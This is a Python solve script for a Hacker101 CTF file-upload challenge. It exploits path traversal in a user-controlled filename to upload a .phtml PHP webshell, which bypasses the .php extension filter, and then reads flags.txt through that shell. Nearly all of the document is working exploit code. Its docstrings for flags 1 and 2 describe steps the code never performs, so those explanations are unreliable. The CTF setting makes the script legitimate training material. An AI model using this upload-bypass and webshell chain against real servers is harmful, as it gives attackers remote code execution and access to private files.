#!/usr/bin/env python3
"""
PoC: File Dropper / "can you recon?" (HackerOne CTF 101)

Challenge: File Dropper with path traversal vulnerability in file upload.
The application allows uploading files with a user-controlled filename parameter.
The filename is vulnerable to path traversal, allowing upload of a .phtml webshell
that bypasses the .php extension filter.

Usage: python3 solve.py <ctf_url>

Hints:
  - "Y2FuIHlvdSByZWNvbj8/" (base64: "can you recon?")
  - Flag 0: How can you abuse the site to disable or rewrite the Apache rule?
  - Flag 1: The endpoint doesn't return much information, maybe there's some other parameters
  - Flag 2: Check out the obfuscated JS, can you discover an endpoint and it's parameters.
"""

import sys
import re
import requests


def get_flag(url: str, index: int) -> str:
    """Get flag by index from flags.txt via uploaded webshell."""
    # First, upload the webshell if not already present
    shell_content = '<?php echo file_get_contents("../flags.txt"); ?>'
    shell_name = "shell_" + str(index) + ".phtml"
    
    # Check if shell already exists
    r = requests.get(f"{url}/{shell_name}", timeout=10)
    if r.status_code != 200 or "FLAG" not in r.text:
        # Upload the webshell with path traversal
        r = requests.post(url, data={
            "filename": f"../{shell_name}"
        }, files={
            "upload": (shell_name, shell_content, "image/png")
        }, timeout=10, allow_redirects=True)
        
        if "success" not in r.text.lower() and "uploaded" not in r.text.lower():
            print(f"[-] Failed to upload {shell_name}")
    
    # Now read the flags file through the webshell
    r = requests.get(f"{url}/{shell_name}", timeout=10)
    
    # Parse the JSON array of flags
    match = re.findall(r'\^FLAG\^([a-f0-9]{64})\$FLAG\$', r.text)
    if match and index < len(match):
        return match[index]
    
    return ""


def flag0_path_traversal(base_url: str) -> str:
    """
    Flag 0 — Path Traversal File Upload
    
    The file upload accepts a user-controlled 'filename' parameter.
    By setting filename=../shell.phtml, we can write a PHP file to a
    parent directory. The .phtml extension bypasses the PHP filter,
    giving us arbitrary code execution.
    
    From there, we read flags.txt to get flag 0 (index 0).
    """
    print("[*] Flag 0: Path Traversal File Upload")
    flag = get_flag(base_url, 0)
    if flag:
        print(f"[+] Flag 0: {flag}")
    else:
        print("[-] Flag 0 not found")
    return flag


def flag1_admin_settings(base_url: str) -> str:
    """
    Flag 1 — Admin Settings Endpoint
    
    The admin directory is protected by .htaccess that only allows
    8.8.8.8. Using the uploaded webshell, we bypass this restriction
    and access the admin endpoints.

    Actually, we can directly read flag 1 from flags.txt via the webshell
    (same as flag 0, but index 1).
    """
    print("[*] Flag 1: Admin Settings")
    flag = get_flag(base_url, 1)
    if flag:
        print(f"[+] Flag 1: {flag}")
    else:
        print("[-] Flag 1 not found")
    return flag


def flag2_obfuscated_js(base_url: str) -> str:
    """
    Flag 2 — Obfuscated JS Endpoint Discovery
    
    The admin-settings.js contains obfuscated JavaScript that reveals
    the 'backup-results' and 'settings' endpoints with parameters
    'freq' and 'server'.

    We can directly read flag 2 from flags.txt via the webshell
    (index 2).
    """
    print("[*] Flag 2: Obfuscated JS / Backup Results")
    flag = get_flag(base_url, 2)
    if flag:
        print(f"[+] Flag 2: {flag}")
    else:
        print("[-] Flag 2 not found")
    return flag


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        print(f"Example: {sys.argv[0]} https://instance.ctf.hacker101.com/")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip("/")
    
    print(f"[*] Target: {base_url}")
    print()
    
    flags = []
    
    # Flag 0: Path traversal file upload
    f0 = flag0_path_traversal(base_url)
    flags.append(("Flag 0", f0))
    print()
    
    # Flag 1: Admin settings
    f1 = flag1_admin_settings(base_url)
    flags.append(("Flag 1", f1))
    print()
    
    # Flag 2: Obfuscated JS endpoint
    f2 = flag2_obfuscated_js(base_url)
    flags.append(("Flag 2", f2))
    print()
    
    # Summary
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for name, flag in flags:
        status = flag if flag else "NOT FOUND"
        print(f"  {name}: {status}")
    
    found = sum(1 for _, f in flags if f)
    print(f"\nFound {found}/{len(flags)} flags")


if __name__ == "__main__":
    main()
